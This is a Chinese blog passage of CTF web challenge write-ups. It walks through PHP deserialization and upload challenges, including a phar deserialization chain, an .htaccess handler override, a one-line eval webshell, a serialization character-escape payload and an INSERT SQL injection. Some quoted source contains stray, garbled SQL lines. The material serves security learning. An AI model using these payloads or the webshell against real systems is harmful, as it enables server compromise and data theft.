<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三个关键点</p>
<ul>
<li>Upload文件上传</li>
<li>__destruct写文件</li>
<li>__toString扫目录</li>
</ul>
<p>题目给了一个提示为</p>
<p>hint1: webroot changes every 10 mins</p>
<p>也就是我们所在的目录是会随机变得</p>
<p>而且由于__destruct触发的file_put_contents工作目录为根目录，所以需要先知道目前所处绝对路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">    <span class="keyword">echo</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么思路就比较清晰了</p>
<p>首先传一个phar文件上去，接着通过file_get_contents触发phar反序列化得到目前所处目录，接着通过data协议写一个htaccess进去，由于对htaccess进行了一些过滤，需要通过下面的payload绕过一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>

<p>最后通过__destruct写入把我们的木马写入这个txt中即可解析</p>
<h4 id="当前绝对路径获取"><a href="#当前绝对路径获取" class="headerlink" title="当前绝对路径获取"></a>当前绝对路径获取</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了避免文件内容被关键词黑名单检测，可以将phar文件用gzip压缩，将生成的test.phar.gz放到vps上</p>
<p>通过upload上传到userdir下，接下来通过file_get_contents触发phar反序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;phar:&#x2F;&#x2F;upload&#x2F;xx&#x2F;test.phar.gz</span><br></pre></td></tr></table></figure>

<p>即可通过触发phar反序列化拿到路径</p>
<h4 id="写入htaccess"><a href="#写入htaccess" class="headerlink" title="写入htaccess"></a>写入htaccess</h4><p>因为这个userdir已经控制掉了一些php的相关后缀，并且连&lt;和?都已经过滤掉了 ，直接写php是肯定不可能了，所以可以考虑写htaccess，并且通过__destruct触发的file_put_contents将文件写到这个目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;data:image&#x2F;png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>

<h4 id="写入txt"><a href="#写入txt" class="headerlink" title="写入txt"></a>写入txt</h4><p>触发phar反序列化写入txt文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;userdir = <span class="string">'&lt;?php eval($_POST[1]);?&gt;'</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;filename = <span class="string">"/var/www/html/webroot/upload/userdir/xx"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp= <span class="keyword">new</span> dir();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样gzip压缩一下，通过phar协议访问Phar://xxx/xx.gz触发phar,再去访问这个txt，可以看到已经被解析为php</p>
<p>拿到马会发现有个open_basedir限制，传统payload bypass下就可以了。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019安洵杯web题解</title>
    <url>/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自己，感觉有时候做题有点不冷静，也使我错失了很多东西。</p>
<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>第一个参数解两次base64加一次md5,传index进去拿到源码，</p>
<p>(正则有点小问题，导致了非预期)\ bypass下命令执行 c\at flag 拿到flag</p>
<h3 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的可以看到用了filter函数去处理了序列化数据，并且替换为空，这样就造成了反序列化字符逃逸，通过extract变量覆盖，配合字符逃逸把原本的img字段吞掉就可以的</p>
<p>构造payload： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[user]&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&amp;_SESSION[img]&#x3D;1&amp;_SESSION[&quot;;s:2:&quot;im&quot;;s:2:&quot;11&quot;;s:3:&quot;img]&#x3D;L2QwZzNfZmxsbGxsbGFn</span><br></pre></td></tr></table></figure>

<h3 id="iamthinking"><a href="#iamthinking" class="headerlink" title="iamthinking"></a>iamthinking</h3><p>挺可惜的一道题，一直在调试我原来跟进的payload，错失了一血</p>
<p>最后换了个pop就打通了(最后拿了三血…,数组bypass一下首字符为O的匹配就ok了</p>
<h3 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h3><p>被解码坑死..，源码如下</p>
<p>主要审计下这个helper类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">    $array = <span class="keyword">array</span>();</span><br><span class="line">    $array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">    $array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">    $array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">    $img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    $my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">    $array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">    <span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">        $rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    $filename = $info[<span class="string">"name"</span>];</span><br><span class="line">    $ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">    $cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    $con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">    &#125;</span><br><span class="line">    $sql_fields = <span class="keyword">array</span>();</span><br><span class="line">    $sql_val = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">        $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">        $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">        $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">    &#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">    $sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">    insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    mysqli_query($con, $sql);</span><br><span class="line">    $id = mysqli_insert_id($con);</span><br><span class="line">    mysqli_close($con);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($path);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment"># Read some config html</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>helper类存在一些漏洞点</p>
<p>触发点还是明显的通过__destruct触发view_files去任意读文件，找一下触发点，在show.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">    $result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">            <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">                $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">                $attr = unserialize($attr_temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只对attr字段进行反序列化，所以我们要把attr字段放入我们的序列化数据，看这道题出现的\0\0\0和chr(0).’*’.chr(0)字段，就想起了前段时间看到的Joomla rce，导致我开始的思路有点偏..浪费了不少时间，其实和这个rce并没有关系..</p>
<p>首先可以发现在helper.php中存在insert注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">    $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">    $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">    $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>

<p>并没有对输入进去的数据进行处理，单引号即可闭合，然后就是一个坑点了.其实到了这步思路就很清晰了，通过insert注入把我们的序列化数据注入，然后触发show.php的反序列化直接拿到flag,接下来就是我自己的踩坑记了</p>
<p>首先踩了Insert注入这个坑</p>
